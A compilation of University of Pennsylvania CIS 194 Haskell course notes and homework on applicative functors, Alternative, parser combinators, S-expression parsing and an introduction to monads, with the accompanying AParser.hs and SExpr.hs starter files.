for each value of `e`.  To map a function over every value in such a
container corresponds exactly to function composition: to pick an
element out of the transformed container, we first we apply the `(e ->
a)` function to pick out an `a` from the original container, and then
apply the `(a -> b)` function to transform the element we picked.

 <!--

Local Variables: 
mode:markdown
compile-command:"mk pre"
End:

-->



/CS194 Lectures 10 Applicative functors, Part I
===============================================

 <!-- CLASS

> {-# LANGUAGE GeneralizedNewtypeDeriving, NoMonomorphismRestriction #-}

-->

CIS 194 Week 10  
25 March 2012

Suggested reading: 

  * [Applicative Functors](http://learnyouahaskell.com/functors-applicative-functors-and-monoids#applicative-functors) from Learn You a Haskell
  * [The Typeclassopedia](http://www.haskell.org/haskellwiki/Typeclassopedia)

Motivation
----------

Consider the following `Employee` type: 

> type Name = String
>
> data Employee = Employee { name    :: Name
>                          , phone   :: String }
>                 deriving Show

Of course, the `Employee` constructor has type 

~~~~ {.haskell}
Employee :: Name -> String -> Employee
~~~~

That is, if we have a `Name` and a `String`, we can apply the
`Employee` constructor to build an `Employee` object.

Suppose, however, that we don't have a `Name` and a `String`; what we
actually have is a `Maybe Name` and a `Maybe String`.  Perhaps they
came from parsing some file full of errors, or from a form where some
of the fields might have been left blank, or something of that sort.
We can't necessarily make an `Employee`.  But surely we can make a
`Maybe Employee`.  That is, we'd like to take our `(Name -> String ->
Employee)` function and turn it into a `(Maybe Name -> Maybe String ->
Maybe Employee)` function.  Can we write something with this type?

~~~~ {.haskell}
(Name -> String -> Employee) ->
(Maybe Name -> Maybe String -> Maybe Employee)
~~~~

Sure we can, and I am fully confident that you could write it in your
sleep by now.  We can imagine how it would work: if either the name or
string is `Nothing`, we get `Nothing` out; if both are `Just`, we get
out an `Employee` built using the `Employee` constructor (wrapped in
`Just`).  But let's keep going...

Consider this: now instead of a `Name` and a `String` we have a
`[Name]` and a `[String]`.  Maybe we can get an `[Employee]` out of
this?  Now we want

~~~~ {.haskell}
(Name -> String -> Employee) ->
([Name] -> [String] -> [Employee])
~~~~

We can imagine two different ways for this to work: we could match up
corresponding `Name`s and `String`s to form `Employee`s; or we could
pair up the `Name`s and `String`s in all possible ways.

Or how about this: we have an `(e -> Name)` and `(e -> String)`
for some type `e`.  For example, perhaps `e` is some huge data
structure, and we have functions telling us how to extract a `Name` and
a `String` from it.  Can we make it into an `(e -> Employee)`, that
is, a recipe for extracting an `Employee` from the same structure?

~~~~ {.haskell}
(Name -> String -> Employee) ->
((e -> Name) -> (e -> String) -> (e -> Employee))
~~~~

No problem, and this time there's really only one way to write this
function.

Generalizing
------------

Now that we've seen the usefulness of this sort of pattern, let's
generalize a bit.  The type of the function we want really looks
something like this:

~~~~ {.haskell}
(a -> b -> c) -> (f a -> f b -> f c)
~~~~

Hmm, this looks familiar... it's quite similar to the type of `fmap`!

~~~~ {.haskell}
fmap :: (a -> b) -> (f a -> f b)
~~~~

The only difference is an extra argument; we might call our desired
function `fmap2`, since it takes a function of two arguments.  Perhaps
we can write `fmap2` in terms of `fmap`, so we just need a `Functor`
constraint on `f`:

> fmap2 :: Functor f => (a -> b -> c) -> (f a -> f b -> f c)
> fmap2 h fa fb = undefined

Try hard as we might, however, `Functor` does not quite give us enough
to implement `fmap2`.  What goes wrong?  We have

~~~~ {.haskell}
h  :: a -> b -> c
fa :: f a
fb :: f b
~~~~

Note that we can also write the type of `h` as `a -> (b -> c)`. So,
we have a function that takes an `a`, and we have a value of type `f
a`... the only thing we can do is use `fmap` to lift the function over
the `f`, giving us a result of type:

~~~~ {.haskell}
h         :: a -> (b -> c)
fmap h    :: f a -> f (b -> c)
fmap h fa :: f (b -> c)
~~~~

OK, so now we have something of type `f (b -> c)` and something of
type `f b`... and here's where we are stuck!  `fmap` does not help any
more.  It gives us a way to apply functions to values inside a
`Functor` context, but what we need now is to apply a functions *which
are themselves in a `Functor` context* to values in a `Functor` context.

Applicative
-----------

Functors for which this sort of "contextual application" is possible
are called *applicative*, and the `Applicative` class (defined in
[`Control.Applicative`](http://haskell.org/ghc/docs/latest/html/libraries/base/Control-Applicative.html))
captures this pattern.

> class Functor f => Applicative f where
>   pure  :: a -> f a
>   (<*>) :: f (a -> b) -> f a -> f b

The `(<*>)` operator (often pronounced "ap", short for "apply")
encapsulates exactly this principle of "contextual application".  Note
also that the `Applicative` class requires its instances to be
instances of `Functor` as well, so we can always use `fmap` with
instances of `Applicative`.  Finally, note that `Applicative` also has
another method, `pure`, which lets us inject a value of type `a` into
a container.  For now, it is interesting to note that `fmap0` would be
another reasonable name for `pure`:

~~~~ {.haskell}
pure  :: a             -> f a
fmap  :: (a -> b)      -> f a -> f b
fmap2 :: (a -> b -> c) -> f a -> f b -> f c
~~~~

Now that we have `(<*>)`, we can implement `fmap2`, which in the
standard library is actually called `liftA2`:

> liftA2 :: Applicative f => (a -> b -> c) -> f a -> f b -> f c
> liftA2 h fa fb = (h `fmap` fa) <*> fb

In fact, this pattern is so common that `Control.Applicative` defines
`(<$>)` as a synonym for `fmap`,

> (<$>) :: Functor f => (a -> b) -> f a -> f b
> (<$>) = fmap

so that we can write 

~~~~ {.haskell}
liftA2 h fa fb = h <$> fa <*> fb
~~~~

What about `liftA3`?

> liftA3 :: Applicative f => (a -> b -> c -> d) -> f a -> f b -> f c -> f d
> liftA3 h fa fb fc = ((h <$> fa) <*> fb) <*> fc

(Note that the precedence and associativity of `(<$>)` and `(<*>)` are
actually defined in such a way that all the parentheses above are
unnecessary.)

Nifty!  Unlike the jump from `fmap` to `liftA2` (which required
generalizing from `Functor` to `Applicative`), going from `liftA2` to
`liftA3` (and from there to `liftA4`, ...) requires no extra
power---`Applicative` is enough.

Actually, when we have all the arguments like this we usually don't
bother calling `liftA2`, `liftA3`, and so on, but just use the `f <$>
x <*> y <*> z <*> ...` pattern directly. (`liftA2` and friends do come
in handly for partial application, however.)

But what about `pure`?  `pure` is for situations where we want to
apply some function to arguments in the context of some functor `f`,
but one or more of the arguments is *not* in `f`---those arguments
are "pure", so to speak.  We can use `pure` to lift them up into `f`
first before applying.  Like so:

> liftX :: Applicative f => (a -> b -> c -> d) -> f a -> b -> f c -> f d
> liftX h fa b fc = h <$> fa <*> pure b <*> fc

Applicative laws
----------------

There is only one really "interesting" law for `Applicative`:

~~~~ {.haskell}
f `fmap` x === pure f <*> x
~~~~

Mapping a function `f` over a container `x` ought to give the same
results as first injecting the function into the container, and then
applying it to `x` with `(<*>)`.

There are other laws, but they are not as instructive; you can read
about them on your own if you really want.

Applicative examples
--------------------

**Maybe**

Let's try writing some instances of `Applicative`, starting with
`Maybe`.  `pure` works by injecting a value into a `Just` wrapper;
`(<*>)` is function application with possible failure.  The result is
`Nothing` if either the function or its argument are.

> instance Applicative Maybe where
>   pure              = Just
>   Nothing <*> _     = Nothing
>   _ <*> Nothing     = Nothing
>   Just f <*> Just x = Just (f x)

Let's see an example:

> m_name1, m_name2 :: Maybe Name
> m_name1 = Nothing
> m_name2 = Just "Brent"
>
> m_phone1, m_phone2 :: Maybe String
> m_phone1 = Nothing
> m_phone2 = Just "555-1234"
>
> exA = Employee <$> m_name1 <*> m_phone1
> exB = Employee <$> m_name1 <*> m_phone2
> exC = Employee <$> m_name2 <*> m_phone1
> exD = Employee <$> m_name2 <*> m_phone2


 <!--

Local Variables: 
mode:markdown
compile-command:"mk pre"
End:

-->

/CIS 194: Homework 10
=====================

CIS 194: Homework 10 
Due Monday, April 1

*  Files you should submit: AParser.hs. You should take the versions
   that we have provided and add your solutions to them.

Introduction

A parser is an algorithm which takes unstructured data as input 
(often a String) and produces structured data as output. For example,
when you load a Haskell file into ghci, the first thing it does is parse
your file in order to turn it from a long String into an abstract syntax
tree representing your code in a more structured form.

Concretely, we will represent a parser for a value of type a as a
function which takes a String represnting the input to be parsed,
and succeeds or fails; if it succeeds, it returns the parsed value along
with whatever part of the input it did not use.
::

   newtype Parser a
   = Parser { runParser :: String -> Maybe (a, String) }

For example, satisfy takes a Char predicate and constructs a
parser which succeeds only if it sees a Char that satisfies the predicate 
(which it then returns). If it encounters a Char that does not
satisfy the predicate (or an empty input), it fails.
::

   satisfy :: (Char -> Bool) -> Parser Char
   satisfy p = Parser f
   where
   f [] = Nothing -- fail on the empty input
   f (x:xs) -- check if x satisfies the predicate
   -- if so, return x along with the remainder
   -- of the input (that is, xs)
   | p x = Just (x, xs)
   | otherwise = Nothing -- otherwise, fail

Using satisfy, we can also define the parser char, which expects to
see exactly a given character and fails otherwise.
::

   char :: Char -> Parser Char
   char c = satisfy (== c)

For example: 

   *Parser> runParser (satisfy isUpper) "ABC"
   Just (‚ÄôA‚Äô,"BC")
   cis 194: homework 10 2
   *Parser> runParser (satisfy isUpper) "abc"
   Nothing
   *Parser> runParser (char ‚Äôx‚Äô) "xyz"
   Just (‚Äôx‚Äô,"yz")

For convenience, we‚Äôve also provided you with a parser for positive integers:

   posInt :: Parser Integer
   posInt = Parser f
   where
   f xs
   | null ns = Nothing
   | otherwise = Just (read ns, rest)
   where (ns, rest) = span isDigit xs

Tools for building parsers

However, implementing parsers explicitly like this is tedious and
error-prone for anything beyond the most basic primitive parsers.
The real power of this approach comes from the ability to create complex 
parsers by combining simpler ones. And this power of combining
will be given to us by. . . you guessed it, Applicative.

Exercise 1

First, you‚Äôll need to implement a Functor instance for Parser.
Hint: You may find it useful to implement a function

   first :: (a -> b) -> (a,c) -> (b,c)

Exercise 2

Now implement an Applicative instance for Parser: 

*  pure a represents the parser which consumes no input and successfully 
   returns a result of a.

*  p1 <*> p2 represents the parser which first runs p1 (which will
   consume some input and produce a function), then passes the
   remaining input to p2 (which consumes more input and produces
   some value), then returns the result of applying the function to the
   value. However, if either p1 or p2 fails then the whole thing should
   also fail (put another way, p1 <*> p2 only succeeds if both p1 and
   p2 succeed).

So what is this good for? Recalling the Employee example from
class,

   type Name = String
   data Employee = Emp { name :: Name, phone :: String }

we could now use the Applicative instance for Parser to make an
employee parser from name and phone parsers. That is, if

   parseName :: Parser Name
   parsePhone :: Parser String
   then
   Emp <$> parseName <*> parsePhone :: Parser Employee

is a parser which first reads a name from the input, then a phone
number, and returns them combined into an Employee record. Of
course, this assumes that the name and phone number are right
next to each other in the input, with no intervening separators. We‚Äôll
see later how to make parsers that can throw away extra stuff that
doesn‚Äôt directly correspond to information you want to parse.

Exercise 3

We can also test your Applicative instance using other simple
applications of functions to multiple parsers. You should implement
each of the following exercises using the Applicative interface to put
together simpler parsers into more complex ones. Do not implement
them using the low-level definition of a Parser! In other words, 
pretend that you do not have access to the Parser constructor or even
know how the Parser type is defined.

*  Create a parser

      abParser :: Parser (Char, Char)

   which expects to see the characters ‚Äôa‚Äô and ‚Äôb‚Äô and returns them
   as a pair. That is,

      *AParser> runParser abParser "abcdef"
      Just ((‚Äôa‚Äô,‚Äôb‚Äô),"cdef")
      *AParser> runParser abParser "aebcdf"
      Nothing

*  Now create a parser

      abParser_ :: Parser ()

   which acts in the same way as abParser but returns () instead of
   the characters ‚Äôa‚Äô and ‚Äôb‚Äô.

      *AParser> runParser abParser_ "abcdef"
      Just ((),"cdef")
      *AParser> runParser abParser_ "aebcdf"
      Nothing

*  Create a parser intPair which reads two integer values separated
   by a space and returns the integer values in a list. You should use
   the provided posInt to parse the integer values.

      *Parser> runParser intPair "12 34"
      Just ([12,34],"")

Exercise 4

Applicative by itself can be used to make parsers for simple, fixed
formats. But for any format involving choice (e.g. ‚Äú. . . after the colon
there can be a number or a word or parentheses. . . ‚Äù) Applicative is
not quite enough. To handle choice we turn to the Alternative class,
defined (essentially) as follows:

   class Applicative f => Alternative f where
   empty :: f a
   (<|>) :: f a -> f a -> f a

(<|>) is intended to represent choice: that is, f1 <|> f2 represents
a choice between f1 and f2. empty should be the identity element for
(<|>), and often represents failure.

Write an Alternative instance for Parser: 

*  empty represents the parser which always fails.

*  p1 <|> p2 represents the parser which first tries running p1. If
   p1 succeeds then p2 is ignored and the result of p1 is returned.
   Otherwise, if p1 fails, then p2 is tried instead.

Hint: there is already an Alternative instance for Maybe which you
may find useful.

Exercise 5 Implement a parser

   intOrUppercase :: Parser ()

which parses either an integer value or an uppercase character, and
fails otherwise.

   *Parser> runParser intOrUppercase "342abcd"
   Just ((), "abcd")
   *Parser> runParser intOrUppercase "XYZ"
   Just ((), "YZ")
   *Parser> runParser intOrUppercase "foo"
   Nothing

Next week, we will use your parsing framework to build a more
sophisticated parser for a small programming language!

https://www.seas.upenn.edu/~cis1940/spring13/extras/10-applicative/AParser.hs

.. code-block:: hs

   {- CIS 194 HW 10
      due Monday, 1 April
   -}

   module AParser where

   import           Control.Applicative

   import           Data.Char

   -- A parser for a value of type a is a function which takes a String
   -- represnting the input to be parsed, and succeeds or fails; if it
   -- succeeds, it returns the parsed value along with the remainder of
   -- the input.
   newtype Parser a = Parser { runParser :: String -> Maybe (a, String) }

   -- For example, 'satisfy' takes a predicate on Char, and constructs a
   -- parser which succeeds only if it sees a Char that satisfies the
   -- predicate (which it then returns).  If it encounters a Char that
   -- does not satisfy the predicate (or an empty input), it fails.
   satisfy :: (Char -> Bool) -> Parser Char
   satisfy p = Parser f
     where
       f [] = Nothing    -- fail on the empty input
       f (x:xs)          -- check if x satisfies the predicate
                           -- if so, return x along with the remainder
                           -- of the input (that is, xs)
           | p x       = Just (x, xs)
           | otherwise = Nothing  -- otherwise, fail

   -- Using satisfy, we can define the parser 'char c' which expects to
   -- see exactly the character c, and fails otherwise.
   char :: Char -> Parser Char
   char c = satisfy (== c)

   {- For example:

   *Parser> runParser (satisfy isUpper) "ABC"
   Just ('A',"BC")
   *Parser> runParser (satisfy isUpper) "abc"
   Nothing
   *Parser> runParser (char 'x') "xyz"
   Just ('x',"yz")

   -}

   -- For convenience, we've also provided a parser for positive
   -- integers.
   posInt :: Parser Integer
   posInt = Parser f
     where
       f xs
         | null ns   = Nothing
         | otherwise = Just (read ns, rest)
         where (ns, rest) = span isDigit xs

   ------------------------------------------------------------
   -- Your code goes below here
   ------------------------------------------------------------


/CS194 Lectures 11 Applicative functors, Part II
================================================

CIS 194 Week 11  
1 April 2012

Suggested reading: 

  * [Applicative Functors](http://learnyouahaskell.com/functors-applicative-functors-and-monoids#applicative-functors) from Learn You a Haskell
  * [The Typeclassopedia](http://www.haskell.org/haskellwiki/Typeclassopedia)

We begin with a review of the `Functor` and `Applicative` type
classes:

> class Functor f where
>   fmap :: (a -> b) -> f a -> f b
>
> class Functor f => Applicative f where
>   pure  :: a -> f a
>   (<*>) :: f (a -> b) -> f a -> f b

Every `Applicative` is also a `Functor`---so can we implement `fmap`
in terms of `pure` and `(<*>)`?  Let's try!

> fmap g x = pure g <*> x

Well, that has the right type at least!  However, it's not hard to
imagine making `Functor` and `Applicative` instances for some type
such that this equality does not hold.  Since this would be a fairly
dubious situation, we stipulate as a *law* that this equality must
hold---this is a formal way of stating that the `Functor` and
`Applicative` instances for a given type must "play nicely together".

Now, let's see a few more examples of `Applicative` instances.

More Applicative Examples
-------------------------

**Lists**

How about an instance of `Applicative` for lists?  There are actually
two possible instances: one that matches up the list of functions and
list of arguments elementwise (that is, it "zips" them together), and
one that combines functions and arguments in all possible ways.

First, let's write the instance that does all possible combinations.
(For reasons that will become clear next week, this is the default
instance.)  From this point of view, lists represent nondeterminism:
that is, a value of type `[a]` can be thought of as a single value
with multiple possibilities.  Then `(<*>)` corresponds to
nondeterministic function application---that is, the application of a
nondeterministic function to a nondeterministic argument.

> instance Applicative [] where
>   pure a        = [a]          -- a "deterministic" value
>   [] <*> _      = []
>   (f:fs) <*> as = (map f as) ++ (fs <*> as)

Here's an example:

> names  = ["Joe", "Sara", "Mae"]
> phones = ["555-5555", "123-456-7890", "555-4321"]
>
> employees1 = Employee <$> names <*> phones

Maybe this particular example doesn't make that much sense, but it's
not hard to imagine situations where you want to combine things in all
possible ways like this.  For example, we can do nondeterministic
arithmetic like so:

> (.+) = liftA2 (+)    -- addition lifted to some Applicative context
> (.*) = liftA2 (*)    -- same for multiplication
>
> -- nondeterministic arithmetic
> n = ([4,5] .* pure 2) .+ [6,1] -- (either 4 or 5) times 2, plus either 6 or 1
>
> -- and some possibly-failing arithmetic too, just for fun
> m1 = (Just 3 .+ Just 5) .* Just 8
> m2 = (Just 3 .+ Nothing) .* Just 8

Next, let's write the instance that does elementwise combining.
First, we must answer an important question: how should we handle
lists of different lengths?  Some thought reveals that the most
sensible thing to do is to truncate the longer list to the length of
the shorter, throwing away the extra elements.  Of course there are
other possible answers: we might, for instance, extend the shorter
list by copying the last element (but then what do we do when one of
the lists is empty?); or extend the shorter list with a "neutral"
element (but then we would have to require an instance of `Monoid`, or
an extra "default" argument for the application).

This decision in turn dictates how we must implement `pure`, since we
must obey the law

~~~~ {.haskell}
pure f <*> xs === f <$> xs
~~~~

Notice that the right-hand side is a list with the same length as
`xs`, formed by applying `f` to every element in `xs`.  The only way
we can make the left-hand side turn out the same... is for `pure` to
create an infinite list of copies of `f`, because we don't know in
advance how long `xs` is going to be.

We implement the instance using a `newtype` wrapper to distinguish it
from the other list instance. The standard Prelude function `zipWith`
also comes in handy.

> newtype ZipList a = ZipList { getZipList :: [a] }
>   deriving (Eq, Show, Functor)
>
> instance Applicative ZipList where
>   pure = ZipList . repeat
>   ZipList fs <*> ZipList xs = ZipList (zipWith ($) fs xs)

An example:

> employees2 = getZipList $ Employee <$> ZipList names <*> ZipList phones

**Reader/environment**

Let's do one final example instance, for `(->) e`.  This is known as
the *reader* or *environment* applicative, since it allows "reading"
from the "environment" `e`.  Implementing the instance is not too
hard, we just have to use our nose and follow the types:

> instance Functor ((->) e) where
>   fmap = (.)
>
> instance Applicative ((->) e) where
>   pure = const
>   f <*> x = \e -> (f e) (x e)

An `Employee` example:

> data BigRecord = BR { getName         :: Name
>                     , getSSN          :: String
>                     , getSalary       :: Integer
>                     , getPhone        :: String
>                     , getLicensePlate :: String
>                     , getNumSickDays  :: Int
>                     }
>
> r = BR "Brent" "XXX-XX-XXX4" 600000000 "555-1234" "JGX-55T3" 2
>
> getEmp :: BigRecord -> Employee
> getEmp = Employee <$> getName <*> getPhone
>
> exQ = getEmp r

Aside: Levels of Abstraction
----------------------------

`Functor` is a nifty tool but relatively straightforward.  At first
glance it seems like `Applicative` doesn't add that much beyond what
`Functor` already provides, but it turns out that it's a small
addition with a huge impact.  `Applicative` (and as we will see next
week, `Monad`) deserves to be called a "model of computation", while
`Functor` doesn't.

When working with things like `Applicative` and `Monad`, it's very
important to keep in mind that there are *multiple levels of
abstraction* involved.  Roughly speaking, an *abstraction* is
something which *hides details* of a lower level, providing a
"high-level" interface that can be used (ideally) without thinking
about the lower level---although the details of the lower level often
"leak through" in certain cases.  This idea of layers of abstraction
is widespread. Think about user programs---OS---kernel---integrated
circuits---gates---silicon, or HTTP---TCP---IP---Ethernet, or
programming languages---bytecode---assembly---machine code.  As we
have seen, Haskell gives us many nice tools for constructing multiple
layers of abstraction *within Haskell programs themselves*, that is,
we get to dynamically extend the "programming language" layer stack
upwards.  This is a powerful facility but can lead to confusion.  One
must learn to explicitly be able to think on multiple levels, and to
switch between levels.

With respect to `Applicative` and `Monad` in particular, there are
just two levels to be concerned with.  The first is the level of
implementing various `Applicative` and `Monad` instances, *i.e.* the
"raw Haskell" level.  You gained some experience with this level in
your previous homework, when you implemented an `Applicative` instance
for `Parser`.

Once we have an `Applicative` instance for a type like `Parser`, the
point is that we get to "move up a layer" and program with `Parser`s
*using the `Applicative` interface*, without thinking about the
details of how `Parser` and its `Applicative` instance are actually
implemented.  You got a little bit of experience with this on last
week's homework, and will get a lot more of it this week. Programming
at this level has a very different feel than actually implementing the
instances.  Let's see some examples.

The Applicative API
-------------------

One of the benefits of having a unified interface like `Applicative`
is that we can write generic tools and control structures that work
with *any* type which is an instance of `Applicative`.  As a first
example, let's try writing

> pair :: Applicative f => f a -> f b -> f (a,b)

`pair` takes two values and pairs them, but all in the context of some
`Applicative f`.  As a first try we can take a function for pairing
and "lift" it over the arguments using `(<$>)` and `(<*>)`:

> pair fa fb = (\x y -> (x,y)) <$> fa <*> fb

This works, though we can simplify it a bit.  First, note that Haskell
allows the special syntax `(,)` to represent the pair constructor, so
we can write

> pair fa fb = (,) <$> fa <*> fb

But actually, we've seen this pattern before---this is the `liftA2`
pattern which got us started down this whole `Applicative` road.  So
we can further simplify to

> pair fa fb = liftA2 (,) fa fb

but now there is no need to explicitly write out the function
arguments, so we reach our final simplified version:

> pair = liftA2 (,)

Now, what does this function do?  It depends, of course, on the
particular `f` chosen.  Let's consider a number of particular
examples:

  * `f = Maybe`: the result is `Nothing` if either of the arguments
    is; if both are `Just` the result is `Just` their pairing.
  * `f = []`: `pair` computes the Cartesian product of two lists.
  * `f = ZipList`: `pair` is the same as the standard `zip` function.
  * `f = IO`: `pair` runs two `IO` actions in sequence, returning a
    pair of their results.
  * `f = Parser`: `pair` runs two parsers in sequence (the parsers
    consume consecutive sections of the input), returning their
    results as a pair.  If either parser fails, the whole thing fails.

Can you implement the following functions?  Consider what each
function does when `f` is replaced with each of the above types.

> (*>)       :: Applicative f => f a -> f b -> f b
> mapA       :: Applicative f => (a -> f b) -> ([a] -> f [b])
> sequenceA  :: Applicative f => [f a] -> f [a]
> replicateA :: Applicative f => Int -> f a -> f [a]

 <!--

Local Variables: 
mode:markdown
compile-command:"mk pre"
End:

-->


/CIS 194: Homework 11
=========================

CIS 194: Homework 11 
Due Monday, April 8

*  Files you should submit: SExpr.hs. You should take the version
   that we have provided and add your solutions. Note that we have
   also provided AParser.hs‚Äîyou are welcome to use your own
   AParser.hs from last week‚Äôs homework or ours, whichever you
   prefer.

Parsing S-expressions


In AParser.hs from last week‚Äôs homework, we now have the following: 

*  the definition of a basic Parser type
*  a few primitive parsers such as satisfy, char, and posInt
*  Functor, Applicative, and Alternative instances for Parser

So, what can we do with this? It may not seem like we have much to
go on, but it turns out we can actually do quite a lot.

Remember, for this week‚Äôs homework you should only need to
write code on top of the interface provided by the Functor, Applicative,
and Alternative instances. In particular, you should not write any
code that depends on the details of the Parser implementation. (To
help with this, the version of AParser.hs we provided this week does
not even export the Parser constructor, so it is literally impossible to
depend on the details!)

Exercise 1

First, let‚Äôs see how to take a parser for (say) widgets and turn it
into a parser for lists of widgets. In particular, there are two functions
you should implement: zeroOrMore takes a parser as input and runs
it consecutively as many times as possible (which could be none, if
it fails right away), returning a list of the results. zeroOrMore always
succeeds. oneOrMore is similar, except that it requires the input parser
to succeed at least once. If the input parser fails right away then
oneOrMore also fails.

For example, below we use zeroOrMore and oneOrMore to parse a
sequence of uppercase characters. The longest possible sequence of
uppercase characters is returned as a list. In this case, zeroOrMore
and oneOrMore behave identically::

   *AParser> runParser (zeroOrMore (satisfy isUpper)) "ABCdEfgH"
   Just ("ABC","dEfgH")
   *AParser> runParser (oneOrMore (satisfy isUpper)) "ABCdEfgH"
   Just ("ABC","dEfgH")

The difference between them can be seen when there is not an uppercase 
character at the beginning of the input. zeroOrMore succeeds
and returns the empty list without consuming any input; oneOrMore
fails.

   *AParser> runParser (zeroOrMore (satisfy isUpper)) "abcdeFGh"
   Just ("","abcdeFGh")
   *AParser> runParser (oneOrMore (satisfy isUpper)) "abcdeFGh"
   Nothing

Implement zeroOrMore and oneOrMore with the following type
signatures: Hint: To parse one or more occurrences
of p, run p once and then parse zero or more occurrences of p.
To parse zero or more occurrences of p, try parsing one
or more; if that fails, return the empty list.

   zeroOrMore :: Parser a -> Parser [a]
   oneOrMore :: Parser a -> Parser [a]

Exercise 2

There are a few more utility parsers needed before we can accomplish the 
final parsing task. First, spaces should parse a consecutive
list of zero or more whitespace characters (use the isSpace function
from the standard Data.Char module).

   spaces :: Parser String

Next, ident should parse an identifier, which for our purposes
will be an alphabetic character (use isAlpha) followed by zero or
more alphanumeric characters (use isAlphaNum). In other words, an
identifier can be any nonempty sequence of letters and digits, except
that it may not start with a digit.

   ident :: Parser String

For example: 

   *AParser> runParser ident "foobar baz"
   Just ("foobar"," baz")
   *AParser> runParser ident "foo33fA"
   Just ("foo33fA","")
   *AParser> runParser ident "2bad"
   Nothing
   *AParser> runParser ident ""
   Nothing

Exercise 3

S-expressions are a simple syntactic format for tree-structured data,
originally developed as a syntax for Lisp programs. We‚Äôll close out
our demonstration of parser combinators by writing a simple Sexpression parser.
An identifier is represented as just a String; the format for valid
identifiers is represented by the ident parser you wrote in the previous exercise.

   type Ident = String

An ‚Äúatom‚Äù is either an integer value (which can be parsed with
posInt) or an identifier.

   data Atom = N Integer | I Ident
   deriving Show

Finally, an S-expression is either an atom, or a list of S-expressions.
Actually, this is slightly different than the usual definition of S-expressions
in Lisp, which also includes binary ‚Äúcons‚Äù cells; but it‚Äôs good enough for
our purposes.

   data SExpr = A Atom
   | Comb [SExpr]
   deriving Show

Textually, S-expressions can optionally begin and end with any
number of spaces; after throwing away leading and trailing spaces they
consist of either an atom, or an open parenthesis followed by one or
more S-expressions followed by a close parenthesis.

   atom ::= int
   | ident

   S ::= atom
   | (S‚àó)

For example, the following are all valid S-expressions: 

   5
   foo3
   (bar (foo) 3 5 874)
   (((lambda x (lambda y (plus x y))) 3) 5)
   ( lots of ( spaces in ) this ( one ) )

We have provided Haskell data types representing S-expressions in
SExpr.hs. Write a parser for S-expressions, that is, something of type

   parseSExpr :: Parser SExpr

Hints: To parse something but ignore its output, you can use the
(*>) and (<*) operators, which have the types

   (*>) :: Applicative f => f a -> f b -> f b
   (<*) :: Applicative f => f a -> f b -> f a

p1 *> p2 runs p1 and p2 in sequence, but ignores the result of
p1 and just returns the result of p2. p1 <* p2 also runs p1 and p2 in
sequence, but returns the result of p1 (ignoring p2‚Äôs result) instead.
For example:

   *AParser> runParser (spaces *> posInt) " 345"
   Just (345,"")

https://www.seas.upenn.edu/~cis1940/spring13/extras/11-applicative2/AParser.hs

.. code-block:: hs

   module AParser (Parser, runParser, satisfy, char, posInt) where

   import           Control.Applicative
   import           Data.Char

   newtype Parser a = Parser { runParser :: String -> Maybe (a, String) }

   satisfy :: (Char -> Bool) -> Parser Char
   satisfy p = Parser f
     where
       f [] = Nothing
       f (x:xs)
           | p x       = Just (x, xs)
           | otherwise = Nothing

   char :: Char -> Parser Char
   char c = satisfy (== c)

   posInt :: Parser Integer
   posInt = Parser f
     where
       f xs
         | null ns   = Nothing
         | otherwise = Just (read ns, rest)
         where (ns, rest) = span isDigit xs

   inParser f = Parser . f . runParser

   first :: (a -> b) -> (a,c) -> (b,c)
   first f (x,y) = (f x, y)

   instance Functor Parser where
     fmap = inParser . fmap . fmap . first

   instance Applicative Parser where
     pure a = Parser (\s -> Just (a, s))
     (Parser fp) <*> xp = Parser $ \s ->
       case fp s of
         Nothing     -> Nothing
         Just (f,s') -> runParser (f <$> xp) s'

   instance Alternative Parser where
     empty = Parser (const Nothing)
     Parser p1 <|> Parser p2 = Parser $ liftA2 (<|>) p1 p2


https://www.seas.upenn.edu/~cis1940/spring13/extras/11-applicative2/SExpr.hs

.. code-block:: hs

   {- CIS 194 HW 11
      due Monday, 8 April
   -}

   module SExpr where

   import AParser
   import Control.Applicative

   ------------------------------------------------------------
   --  1. Parsing repetitions
   ------------------------------------------------------------

   zeroOrMore :: Parser a -> Parser [a]
   zeroOrMore p = undefined

   oneOrMore :: Parser a -> Parser [a]
   oneOrMore p = undefined

   ------------------------------------------------------------
   --  2. Utilities
   ------------------------------------------------------------

   spaces :: Parser String
   spaces = undefined

   ident :: Parser String
   ident = undefined

   ------------------------------------------------------------
   --  3. Parsing S-expressions
   ------------------------------------------------------------

   -- An "identifier" is represented as just a String; however, only
   -- those Strings consisting of a letter followed by any number of
   -- letters and digits are valid identifiers.
   type Ident = String

   -- An "atom" is either an integer value or an identifier.
   data Atom = N Integer | I Ident
     deriving Show

   -- An S-expression is either an atom, or a list of S-expressions.
   data SExpr = A Atom
              | Comb [SExpr]
     deriving Show


/CS194 Lectures 12 Monads
=========================

 <!-- CLASS

> import Control.Monad
> import Control.Applicative

-->

CIS 194 Week 12  
8 April 2013

Suggested reading: 

  * [The Typeclassopedia](http://www.haskell.org/haskellwiki/Typeclassopedia)
  * [LYAH Chapter 12: A Fistful of Monads](http://learnyouahaskell.com/a-fistful-of-monads)
  * [LYAH Chapter 9: Input and Output](http://learnyouahaskell.com/input-and-output)
  * [RWH Chapter 7: I/O](http://book.realworldhaskell.org/read/io.html)
  * [RWH Chapter 14: Monads](http://book.realworldhaskell.org/read/monads.html)
  * [RWH Chapter 15: Programming with monads](http://book.realworldhaskell.org/read/programming-with-monads.html)

Motivation
----------

Over the last couple of weeks, we have seen how the `Applicative`
class allows us to idiomatically handle computations which take place
in some sort of "special context"---for example, taking into account
possible failure with `Maybe`, multiple possible outputs with `[]`,
consulting some sort of environment using `((->) e)`, or construct
parsers using a "combinator" approach, as in the homework.

However, so far we have only seen computations with a fixed structure,
such as applying a data constructor to a fixed set of arguments.  What
if we don't know the structure of the computation in advance -- that
is, we want to be able to decide what to do based on some intermediate
results?

As an example, recall the `Parser` type from the homework, and assume
that we have implemented `Functor` and `Applicative` instances for it:

> newtype Parser a = Parser { runParser :: String -> Maybe (a, String) }

~~~~ {.haskell}
instance Functor Parser where
  ...

instance Applicative Parser where 
  ...
~~~~

Recall that a value of type `Parser a` represents a *parser* which can
take a `String` as input and possibly produce a value of type `a`,
along with the remaining unparsed portion of the `String`.  For
example, a parser for integers, given as input the string

    "143xkkj"

might produce as output 

    Just (143, "xkkj")

As you saw in the homework, we can now write things like 

~~~~ {.haskell}
data Foo = Bar Int Int Char
parseFoo :: Parser Foo
parseFoo = Bar <$> parseInt <*> parseInt <*> parseChar
~~~~

assuming we have functions `parseInt :: Parser Int` and `parseChar ::
Parser Char`.  The `Applicative` instance automatically handles the
possible failure (if parsing any of the components fail, parsing the
entire `Foo` will fail) and threading through the unconsumed portion
of the `String` input to each component in turn.

